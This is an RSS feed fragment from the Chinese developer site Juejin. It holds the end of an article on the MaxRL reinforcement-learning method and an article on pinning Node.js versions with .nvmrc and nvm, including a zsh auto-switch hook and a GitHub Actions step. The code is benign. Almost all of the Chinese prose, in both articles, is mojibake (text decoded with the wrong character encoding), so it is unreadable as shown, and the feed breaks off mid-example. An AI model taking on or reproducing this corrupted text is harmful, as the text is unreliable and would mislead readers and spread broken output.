<p>å› æ­¤ï¼Œæœ¬æ–‡é‡‡ç”¨äº†ä¸€ç§ç®€å•çš„ç­–ç•¥ï¼šä»éæ¡ä»¶åŒ–çš„ç­–ç•¥åˆ†å¸ƒè¿›è¡Œé‡‡æ ·ï¼Œä½†åªå¯¹æˆåŠŸè½¨è¿¹è¿›è¡Œå¹³å‡ï¼Œå¾—åˆ°äº†å¼ºåŒ–å­¦ä¹ é£æ ¼çš„ä¼°è®¡å™¨ï¼Œå…¶å…·å¤‡éšç€ rollout æ•°çš„å¢åŠ ï¼Œå¯¹æœ€å¤§ä¼¼ç„¶æ¢¯åº¦çš„è¿‘ä¼¼å°†ä¸æ–­æ”¹å–„çš„ç‰¹æ€§ã€‚</p>
<p>æ¢è¨€ä¹‹ï¼Œåœ¨ MaxRL æ¡†æ¶ä¸‹ï¼Œé¢å¤–çš„è®¡ç®—èµ„æºä¸ä»…æ”¹å–„äº†ä¼°è®¡è´¨é‡ï¼Œæ›´ç›´æ¥æ”¹è¿›äº†è¢«ä¼˜åŒ–çš„ç›®æ ‡æœ¬èº«ã€‚</p>
<p>ä»¤äººæƒŠè®¶çš„æ•ˆç‡è¿›æ­¥</p>
<p>åœ¨å®éªŒä¸­ï¼Œè¿™ä¸€æ”¹å˜å¸¦æ¥äº†è¿œè¶…é¢„æœŸçš„æ”¶ç›Šã€‚ç ”ç©¶å›¢é˜Ÿåœ¨å¤šä¸ªæ¨¡å‹è§„æ¨¡å’Œå¤šç±»ä»»åŠ¡ä¸Šï¼Œå¯¹ MaxRL è¿›è¡Œäº†ç³»ç»Ÿè¯„ä¼°ï¼Œç»“æœæ˜¾ç¤ºï¼šMaxRL åœ¨æ€§èƒ½ä¸è®¡ç®—æ•ˆç‡çš„æƒè¡¡ä¸Šå‡ç¨³å®šåœ°ä¼˜äºç°æœ‰å¼ºåŒ–å­¦ä¹ æ–¹æ³•ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e654863de0054d30b11e8b752b25d53b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=2%2FPgs0gUTQA9SihYm4r%2BRFrHuvs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®éªŒç»“æœç›´è§‚å±•ç¤ºäº† MaxRL åœ¨è®­ç»ƒæ•ˆç‡ä¸Šçš„ä¼˜åŠ¿ã€‚åœ¨ç›¸åŒè®­ç»ƒæ­¥æ•°ä¸‹ï¼ŒMaxRL æ€§èƒ½æå‡æ˜æ˜¾æ›´å¿«ï¼Œå¹¶ä¸”éšç€ rollout æ•°çš„å¢åŠ ï¼ŒMaxRL æŒç»­å—ç›Šã€‚</p>
<p>è¿™ç§ä¼˜åŠ¿å¹¶ä¸åªä½“ç°åœ¨è®­ç»ƒé˜¶æ®µï¼Œç›¸è¾ƒäºä½¿ç”¨ GRPO è®­ç»ƒçš„æ¨¡å‹ï¼ŒMaxRL æµ‹è¯•æ—¶çš„ scaling æ•ˆç‡æœ€é«˜å¯æå‡Â 20 å€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7c6251271f446c79fc748b61100747b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=2kEMNzyFsM4Gq7qP9n5mhh7D9wU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åœ¨è¿·å®«ä»»åŠ¡ä¸Šï¼Œæ— è®ºæµ‹è¯•æ—¶çš„é‡‡æ ·é¢„ç®— k å–ä½•å€¼ï¼Œéšç€è®­ç»ƒ rollouts çš„å¢åŠ ï¼ŒMaxRL éƒ½èƒ½æŒç»­é™ä½ âˆ’log (Pass@k)ï¼Œè€Œ GRPO ä¸ RLOO çš„æ”¹è¿›å¹…åº¦åˆ™æ˜æ˜¾æ›´æ—©è¶‹äºå¹³ç¼“ã€‚è¿™ä¸€ç»“æœç›´è§‚åœ°å±•ç¤ºäº† MaxRL åœ¨è®­ç»ƒé˜¶æ®µæ›´ä¼˜çš„æ€§èƒ½â€“æ•ˆç‡æƒè¡¡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78e0726f198541208b8013af80023669~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=z%2FHhlPeQrjkthjUed7usK3hKqFY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¯”è¾ƒåœ¨ä¸åŒ pass@k è®¾ç½®ä¸‹å„æ–¹æ³•éšè®­ç»ƒä¸­é‡‡æ ·è®¡ç®—å¢åŠ æ—¶çš„ä¼˜åŒ–è¶‹åŠ¿ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå¯¹äº GRPO ä¸ RLOOï¼Œæ›²çº¿åœ¨æ—©æœŸä¸‹é™åè¿…é€Ÿå˜å¹³ï¼Œè¯´æ˜é¢å¤–é‡‡æ ·ä¸»è¦ç”¨äºé™ä½å™ªå£°ï¼›è€Œ MaxRL åœ¨ä¸åŒ k å€¼ä¸‹å‡ä¿æŒæŒç»­ä¸‹é™ï¼Œæ¨åŠ¨æ¨¡å‹ä¸æ–­é€¼è¿‘ä¸€ä¸ªæ›´æ¥è¿‘æœ€å¤§ä¼¼ç„¶çš„ä¼˜åŒ–ç›®æ ‡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/812a03f07a8644b3bc48061da1e9617a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=JlbK%2FwQWrwggYpWo%2FdDB84YH9NM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åœ¨æ›´å¤§è§„æ¨¡è®¾ç½®ä¸‹ï¼ŒMaxRL çš„ä¼˜åŠ¿ä¾ç„¶ä¿æŒç¨³å®šã€‚è¿™è¡¨æ˜ï¼ŒMaxRL æ‰€å¸¦æ¥çš„æ”¹è¿›å¹¶éä¾èµ–äºç‰¹å®šè§„æ¨¡æˆ–è¶…å‚æ•°è®¾ç½®ï¼Œå½“è®­ç»ƒè§„æ¨¡æ‰©å¤§æ—¶ï¼ŒMaxRL å¹¶æœªå‡ºç°æ”¶ç›Šé€’å‡è¿‡å¿«æˆ–ä¼˜åŠ¿æ¶ˆå¤±çš„ç°è±¡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc6b1c5ccece407c938dcb99cc72054a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=2cfyUBmpKhiyFaog8x%2B%2B5ofgGS8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿›ä¸€æ­¥çš„å®éªŒç»“æœè¡¨æ˜ï¼ŒMaxRL çš„ä¼˜åŠ¿å¹¶ä¸ä¾èµ–äºè¿‡äºç†æƒ³åŒ–çš„å®éªŒæ¡ä»¶ï¼Œå³ä½¿åœ¨åé¦ˆå­˜åœ¨å™ªå£°æˆ–éªŒè¯ä¿¡å·å¹¶éå®Œå…¨å¯é çš„è®¾ç½®ä¸‹ï¼ŒMaxRL ä»ç„¶èƒ½å¤Ÿä¿æŒç›¸å¯¹ç¨³å®šçš„æ€§èƒ½ä¼˜åŠ¿ã€‚</p>
<p>æ€»ä½“æ¥çœ‹ï¼ŒMaxRL ä¸ºä¸å¯å¾®ã€åŸºäºé‡‡æ ·çš„å­¦ä¹ é—®é¢˜æä¾›äº†ä¸€ç§æ›´ä¸ºæ·±å…¥çš„è§£æ³•ã€‚å®ƒé€šè¿‡ä¸€ä¸ªéšè®¡ç®—é‡è‡ªç„¶æ‰©å±•çš„ç›®æ ‡æ¡†æ¶ï¼Œç³»ç»Ÿæ€§åœ°é€¼è¿‘çœŸæ­£çš„ä¼¼ç„¶ä¼˜åŒ–ã€‚</p>
<p>å½“ä¼˜åŒ–ç›®æ ‡æœ¬èº«å¯ä»¥éšç®—åŠ›æ¼”è¿›ã€é€æ­¥é€¼è¿‘æœ€å¤§ä¼¼ç„¶ï¼Œå¼ºåŒ–å­¦ä¹ ç©¶ç«Ÿä¼šæˆä¸ºé€šå¾€é€šç”¨æ™ºèƒ½çš„é•¿æœŸç­”æ¡ˆï¼Œè¿˜æ˜¯åªæ˜¯é€šå¾€ä¸‹ä¸€ä¸ªè®­ç»ƒèŒƒå¼çš„è¿‡æ¸¡æ–¹æ¡ˆï¼Ÿ</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Šå‘Šåˆ«â€œæˆ‘ç”µè„‘ä¸Šå¥½å¥½çš„â€ï¼š.nvmrc è®© Node.js ç‰ˆæœ¬ç®¡ç†å˜è½»æ¾ã€‹]]></title>    <link>https://juejin.cn/post/7603160727717953587</link>    <guid>https://juejin.cn/post/7603160727717953587</guid>    <pubDate>2026-02-05T09:39:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603160727717953587" data-draft-id="7603185231801483290" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Šå‘Šåˆ«â€œæˆ‘ç”µè„‘ä¸Šå¥½å¥½çš„â€ï¼š.nvmrc è®© Node.js ç‰ˆæœ¬ç®¡ç†å˜è½»æ¾ã€‹"/> <meta itemprop="keywords" content="å‰ç«¯,Node.js"/> <meta itemprop="datePublished" content="2026-02-05T09:39:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="leafyyuki"/> <meta itemprop="url" content="https://juejin.cn/user/2172290706728829"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Šå‘Šåˆ«â€œæˆ‘ç”µè„‘ä¸Šå¥½å¥½çš„â€ï¼š.nvmrc è®© Node.js ç‰ˆæœ¬ç®¡ç†å˜è½»æ¾ã€‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2172290706728829/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    leafyyuki
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:39:47.000Z" title="Thu Feb 05 2026 09:39:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    17
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å›¢é˜Ÿåä½œå¼€å‘ Node.js é¡¹ç›®æ—¶ï¼Œä½ æ˜¯å¦ç»å¸¸é‡åˆ°è¿™äº›çƒ¦å¿ƒäº‹ï¼Ÿ</p>
<ul>
<li>â€œè¿™ä¸ªæ¨¡å—åœ¨æˆ‘ç”µè„‘ä¸Šè¿è¡Œæ­£å¸¸ï¼Œæ€ä¹ˆåˆ°ä½ é‚£å°±æŠ¥é”™äº†ï¼Ÿâ€</li>
<li>â€œæˆ‘åˆšæ›´æ–°äº† Node ç‰ˆæœ¬ï¼Œä¸ºä»€ä¹ˆè€é¡¹ç›®è·‘ä¸èµ·æ¥äº†ï¼Ÿâ€</li>
<li>æ¯åˆ‡æ¢ä¸€ä¸ªé¡¹ç›®ï¼Œå°±è¦æŸ¥ä¸€ä¸‹å®ƒç”¨çš„ Node ç‰ˆæœ¬ï¼Œç„¶åæ‰‹å¿™è„šä¹±åœ°åˆ‡æ¢ã€‚</li>
</ul>
<p>å¦‚æœä½ çš„ç­”æ¡ˆæ˜¯â€œæ˜¯â€ï¼Œé‚£ä¹ˆÂ  **<code>.nvmrc</code>**â€‹ æ–‡ä»¶å°±æ˜¯ä½ ä¸€ç›´åœ¨å¯»æ‰¾çš„â€œç‰ˆæœ¬ä¸€è‡´æ€§â€è§£å†³æ–¹æ¡ˆã€‚é…åˆ Node ç‰ˆæœ¬ç®¡ç†å·¥å…·Â <strong>nvm</strong>ï¼Œå®ƒèƒ½å¸®ä½ å½»åº•å‘Šåˆ«ç¯å¢ƒæ··ä¹±ã€‚æœ¬æ–‡å°†å¸¦ä½ è½»æ¾æŒæ¡è¿™å¥—æœ€ä½³å®è·µã€‚</p>
<h3 data-id="heading-0">ä»€ä¹ˆæ˜¯ nvm ä¸ .nvmrcï¼Ÿ</h3>
<p><strong>nvm (Node Version Manager)</strong> â€‹ æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå…è®¸ä½ åœ¨åŒä¸€å°æœºå™¨ä¸Šå®‰è£…å’Œåˆ‡æ¢å¤šä¸ªç‰ˆæœ¬çš„ Node.jsã€‚å®ƒå®Œç¾è§£å†³äº†ä¸åŒé¡¹ç›®éœ€è¦ä¸åŒ Node è¿è¡Œç¯å¢ƒçš„éš¾é¢˜ã€‚</p>
<p>è€ŒÂ  **<code>.nvmrc</code>**â€‹ æ–‡ä»¶åˆ™æ˜¯ä¸€ä¸ªâ€œç‰ˆæœ¬è¯´æ˜ä¹¦â€ã€‚ä½ åªéœ€åœ¨é¡¹ç›®æ ¹ç›®å½•åˆ›å»ºè¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶åœ¨é‡Œé¢å†™ä¸Šé¡¹ç›®æ‰€éœ€çš„ Node.js ç‰ˆæœ¬å·ï¼ˆå¦‚Â <code>v20.10.0</code>ï¼‰ã€‚æ­¤åï¼Œä»»ä½•äººæˆ–ä»»ä½•å·¥å…·ï¼ˆåŒ…æ‹¬ä½ çš„é˜Ÿå‹ã€CI/CD æµæ°´çº¿ï¼‰è¿›å…¥è¿™ä¸ªé¡¹ç›®ï¼Œéƒ½èƒ½é€šè¿‡ä¸€æ¡ç®€å•çš„å‘½ä»¤Â <code>nvm use</code>ï¼Œå¿«é€Ÿåˆ‡æ¢åˆ°æ­£ç¡®çš„ç‰ˆæœ¬ã€‚</p>
<h3 data-id="heading-1">å¿«é€Ÿä¸Šæ‰‹ï¼š3æ­¥å»ºç«‹ç‰ˆæœ¬è§„èŒƒ</h3>
<p>æ•´ä¸ªæ ¸å¿ƒæµç¨‹å¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹ä¸‰ä¸ªæ­¥éª¤ï¼š</p>
<pre><code class="hljs language-css" lang="css">flowchart <span class="hljs-selector-tag">TD</span>
    <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[å¼€å§‹: ä½¿ç”¨.nvmrc]</span> --&gt; <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[åœ¨é¡¹ç›®æ ¹ç›®å½•åˆ›å»º.nvmrcæ–‡ä»¶]</span>
    <span class="hljs-selector-tag">B</span> --&gt; C<span class="hljs-selector-attr">[åœ¨æ–‡ä»¶ä¸­å†™å…¥Node.jsç‰ˆæœ¬å·]</span>
    C --&gt; D<span class="hljs-selector-attr">[åœ¨ç»ˆç«¯æ‰§è¡Œnvm use]</span>
    D --&gt; E{ç‰ˆæœ¬æ˜¯å¦å·²å®‰è£…?}
    E -- æ˜¯ --&gt; F<span class="hljs-selector-attr">[æˆåŠŸåˆ‡æ¢åˆ°æŒ‡å®šç‰ˆæœ¬]</span>
    E -- å¦ --&gt; G<span class="hljs-selector-attr">[è‡ªåŠ¨å®‰è£…æŒ‡å®šç‰ˆæœ¬]</span>
    G --&gt; F
    F --&gt; H<span class="hljs-selector-attr">[åœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹é¡¹ç›®ä½¿ç”¨æŒ‡å®šç‰ˆæœ¬]</span>
</code></pre>
<p><strong>1. åˆ›å»ºÂ <code>.nvmrc</code>æ–‡ä»¶</strong></p>
<p>åœ¨ä½ çš„é¡¹ç›®æ ¹ç›®å½•ä¸‹ï¼Œè¿è¡Œå‘½ä»¤åˆ›å»ºæ–‡ä»¶å¹¶æŒ‡å®šç‰ˆæœ¬ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŒ‡å®šç²¾ç¡®ç‰ˆæœ¬ï¼ˆæ¨èï¼Œç¡®ä¿å®Œå…¨ä¸€è‡´ï¼‰</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"v20.10.0"</span> &gt; .nvmrc

<span class="hljs-comment"># æˆ–ä½¿ç”¨ä¸»ç‰ˆæœ¬å·ï¼ˆå°†ä½¿ç”¨20.x.xä¸­çš„æœ€æ–°ç‰ˆï¼‰</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"20"</span> &gt; .nvmrc

<span class="hljs-comment"># æˆ–ä½¿ç”¨LTSç‰ˆæœ¬ï¼ˆå°†ä½¿ç”¨å½“å‰çš„é•¿æœŸæ”¯æŒç‰ˆï¼‰</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"lts/*"</span> &gt; .nvmrc
</code></pre>
<p><strong>2. ä½¿ç”¨æŒ‡å®šç‰ˆæœ¬</strong></p>
<p>åœ¨é¡¹ç›®ç›®å½•ä¸‹ï¼Œæ‰§è¡Œï¼š</p>
<pre><code class="hljs language-perl" lang="perl">nvm <span class="hljs-keyword">use</span>
</code></pre>
<p>nvm ä¼šè‡ªåŠ¨è¯»å–Â <code>.nvmrc</code>æ–‡ä»¶å¹¶åˆ‡æ¢ç‰ˆæœ¬ã€‚å¦‚æœè¯¥ç‰ˆæœ¬æœªå®‰è£…ï¼Œnvm ä¼šç»™å‡ºæ˜ç¡®çš„å®‰è£…æç¤ºã€‚</p>
<p><strong>3. æäº¤åˆ°ä»£ç ä»“åº“</strong></p>
<p>å°†Â <code>.nvmrc</code>æ–‡ä»¶æäº¤åˆ° Git ç­‰ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿä¸­ã€‚è¿™æ˜¯<strong>å›¢é˜Ÿåä½œä¸­è‡³å…³é‡è¦çš„ä¸€æ­¥</strong>ï¼Œç¡®ä¿æ¯ä½å¼€å‘è€…éƒ½èƒ½ä½¿ç”¨ç›¸åŒçš„ Node.js ç¯å¢ƒã€‚</p>
<h3 data-id="heading-2">è¿›é˜¶æŠ€å·§ï¼šè®©ç‰ˆæœ¬åˆ‡æ¢â€œè‡ªåŠ¨åŒ–â€</h3>
<p>å¦‚æœä½ åŒå€¦äº†æ¯æ¬¡è¿›å…¥é¡¹ç›®éƒ½è¦æ‰‹åŠ¨è¾“å…¥Â <code>nvm use</code>ï¼Œå¯ä»¥é€šè¿‡é…ç½® Shell å®ç°<strong>å…¨è‡ªåŠ¨åˆ‡æ¢</strong>ã€‚</p>
<p>å°†ä»¥ä¸‹è„šæœ¬æ·»åŠ åˆ°ä½ çš„Â <code>~/.zshrc</code>æˆ–Â <code>~/.bashrc</code>æ–‡ä»¶æœ«å°¾ï¼ˆæ”¾åœ¨ nvm åˆå§‹åŒ–è¯­å¥ä¹‹åï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç½®äº ~/.zshrc æˆ– ~/.bashrc ä¸­</span>
<span class="hljs-built_in">autoload</span> -U add-zsh-hook
load-<span class="hljs-function"><span class="hljs-title">nvmrc</span></span>() {
  <span class="hljs-built_in">local</span> nvmrc_path=<span class="hljs-string">"<span class="hljs-subst">$(nvm_find_nvmrc)</span>"</span>
  <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">"<span class="hljs-variable">$nvmrc_path</span>"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">local</span> nvmrc_node_version=$(nvm version <span class="hljs-string">"<span class="hljs-subst">$(cat <span class="hljs-string">"<span class="hljs-variable">${nvmrc_path}</span>"</span>)</span>"</span>)
    <span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$nvmrc_node_version</span>"</span> = <span class="hljs-string">"N/A"</span> ]; <span class="hljs-keyword">then</span>
      nvm install
    <span class="hljs-keyword">elif</span> [ <span class="hljs-string">"<span class="hljs-variable">$nvmrc_node_version</span>"</span> != <span class="hljs-string">"<span class="hljs-subst">$(nvm version)</span>"</span> ]; <span class="hljs-keyword">then</span>
      nvm use
    <span class="hljs-keyword">fi</span>
  <span class="hljs-keyword">elif</span> [ <span class="hljs-string">"<span class="hljs-subst">$(nvm version)</span>"</span> != <span class="hljs-string">"<span class="hljs-subst">$(nvm version default)</span>"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"åˆ‡æ¢å› nvm é»˜è®¤ç‰ˆæœ¬"</span>
    nvm use default
  <span class="hljs-keyword">fi</span>
}
add-zsh-hook chpwd load-nvmrc
load-nvmrc
</code></pre>
<p>ä¿å­˜åæ‰§è¡ŒÂ <code>source ~/.zshrc</code>ã€‚é…ç½®å®Œæˆåï¼Œä½ çš„ç»ˆç«¯ä¼šåœ¨è¿›å…¥é¡¹ç›®ç›®å½•æ—¶è‡ªåŠ¨åˆ‡æ¢ Node ç‰ˆæœ¬ï¼Œç¦»å¼€æ—¶åˆ‡å›é»˜è®¤ç‰ˆæœ¬ï¼Œå®ç°â€œæ— æ„Ÿâ€åˆ‡æ¢ã€‚</p>
<h3 data-id="heading-3">èå…¥å¼€å‘ç”Ÿå‘½å‘¨æœŸ</h3>
<p><strong>å›¢é˜Ÿè§„èŒƒ</strong>ï¼šåœ¨å›¢é˜Ÿä¸­ï¼Œåº”å°†â€œé¡¹ç›®å¿…é¡»åŒ…å«Â <code>.nvmrc</code>æ–‡ä»¶â€ä½œä¸ºä¸€é¡¹å¼ºåˆ¶çº¦å®šã€‚è¿™æ˜¯æˆæœ¬æœ€ä½ã€æ•ˆæœæœ€æ˜¾è‘—çš„ç»Ÿä¸€å¼€å‘ç¯å¢ƒçš„æ–¹æ³•ã€‚</p>
<p><strong>CI/CD é›†æˆ</strong>ï¼šåœ¨è‡ªåŠ¨åŒ–æ„å»ºå’Œéƒ¨ç½²æµç¨‹ä¸­ï¼Œ<code>.nvmrc</code>åŒæ ·èƒ½å‘æŒ¥ä½œç”¨ã€‚ä¾‹å¦‚ï¼Œåœ¨ GitHub Actions ä¸­ï¼Œä½ å¯ä»¥ç›´æ¥ä½¿ç”¨å®ƒæ¥è®¾ç½® Node ç¯å¢ƒï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">ä½¿ç”¨</span> <span class="hljs-string">.nvmrc</span> <span class="hljs-string">è®¾ç½®</span> <span class="hljs-string">Node.js</span>
  <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v3</span>
  <span class="hljs-attr">with:</span>
    <span class="hljs-attr">node-version-file:</span> <span class="hljs-string">'.nvmrc'</span>
</code></pre>
<p><strong>åŒä¿é™©ç­–ç•¥</strong>ï¼šä½ è¿˜å¯ä»¥åœ¨Â <code>package.json</code>ä¸­ç”¨Â <code>engines</code>å­—æ®µå†æ¬¡å£°æ˜ Node ç‰ˆæœ¬èŒƒå›´ï¼Œè®©åŒ…ç®¡ç†å™¨ï¼ˆå¦‚ yarnã€pnpmï¼‰ä¹Ÿå‚ä¸ç‰ˆæœ¬æ£€æŸ¥ã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
